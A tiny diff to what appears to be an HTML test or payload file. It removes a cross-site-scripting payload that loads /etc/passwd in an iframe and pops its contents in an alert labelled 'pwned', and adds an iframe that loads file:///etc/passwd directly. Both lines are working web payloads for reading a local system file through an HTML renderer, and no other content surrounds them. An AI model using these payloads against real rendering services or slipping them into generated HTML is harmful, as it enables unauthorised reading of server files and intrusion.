@@ -1,1 +1,6 @@
-<br><BR><BR><BR><h1>pwn<br><iframe onload=j() src=\"/etc/passwd\">xssxsxxsxs</iframe><script type=\"text/javascript\">function j(){alert('pwned contents of /etc/passwd:\n\n '+frames[0].document.body.innerText)}</script>
+<iframe 
+  src="file:///etc/passwd" 
+  width="100%" 
+  height="600px" 
+  style="border:1px solid black;">
+</iframe>
